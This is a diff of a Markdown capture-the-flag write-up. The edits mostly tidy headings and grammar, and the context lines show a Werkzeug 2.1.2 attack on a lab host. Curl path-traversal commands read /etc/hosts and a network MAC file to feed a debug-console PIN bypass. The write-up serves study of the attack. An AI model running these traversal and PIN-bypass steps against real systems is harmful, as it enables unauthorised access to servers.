@@ -26,7 +26,7 @@ sudo nmap -p22,80 -sVC -Pn -n --min-rate 5000 10.10.11.164 -oN Targeted
 ## Web Service Enumeration
 
 - In order to get knowledge of the target, we can use some tools to get info about the technologies used in the web side 
-### [[whatweb]] / [[wappanalyzer]]
+### Used Technologies 
 ```
 whatweb http://<ip>
 ```
@@ -34,8 +34,8 @@ whatweb http://<ip>
 >![[Pasted image 20250225225016.png]]
 >![[Pasted image 20250225225051.png]]
 
-### Web estructure
-- so it using "werkzeug 2.1.2" we can try somethings like [bypass console PIN](https://www.daehee.com/blog/werkzeug-console-pin-exploit) because the Debug is enabled, but first we need to find a path traversal / LFI in order to get `uuid.getnode()` and `get_machine_id()` 
+### Web Features
+-  It using "werkzeug 2.1.2" we can try somethings like [bypass console PIN](https://www.daehee.com/blog/werkzeug-console-pin-exploit) because the Debug is enabled, but first we need to find a path traversal / LFI in order to get `uuid.getnode()` and `get_machine_id()` 
 >[!example]- Result
 >![[Pasted image 20250226152522.png]]
 
@@ -50,7 +50,7 @@ whatweb http://<ip>
 >[!example]- Result
 >![[Pasted image 20250226153247.png]]
 
-- if we look closer we can see that there is a function named `get_file_name()` that came from `app.utils` so lets check it
+- If we look closer we can see that there is a function named `get_file_name()` that come from `app.utils` so lets check it
 >[!example]- Result
 >![[Pasted image 20250226154154.png]]
 
@@ -58,16 +58,16 @@ whatweb http://<ip>
 >[!example]- Result
 >![[Pasted image 20250226160227.png]]
 
-- thats means that we hace a Directory Path Traversal using
+- That's means that we have a Directory Path Traversal using
 ```bash
 curl http://10.10.11.164/uploads/..//etc/hosts --path-as-is --ignore-content-length
 ```
-# Docker Exploitation
+# Exploitation
 ## Inicial Access 1st Method
 
-- so we can exploit the function `os.path.join()` (because if we use `/` the left path of the command will be removed) 
+- We can exploit the function `os.path.join()` (because if we use `/` the left path of the command will be removed) 
 >[!info]- Like this:
->`/route/to/path/public/uploads/MyFileName` 
+>`/route/to/path/public/uploads</MyFileName>` 
 >to
 >`/MyfileName`
 
@@ -103,7 +103,7 @@ export TERM=xterm-256color
 > ![[Pasted image 20250226163759.png]]
 
 ## Inicial Access 2nd Method
-- As we saw above we have a LFI so we have access to the data we need to generate a PIN code to get access to debug console, so get the MAC address:
+- As we saw above we have a LFI so we have access to the data we need to generate a PIN code to get access to debug console, so the MAC address:
 ```bash
 curl http://10.10.11.164/uploads/..//sys/class/net/eth0/address --path-as-is --ignore-content-length
 python -c 'print(0x0242ac110007)'
@@ -172,7 +172,7 @@ print(rv)
 >![[Pasted image 20250226182130.png]]
 >![[Pasted image 20250226182248.png]]
 
-- This happened because de version of the application, we have to chain the encrypt mode to `sha1`, like this
+- This happened because the version of the application, we have to chain the encrypt mode to `sha1`, like this
 
 ```python
 import hashlib
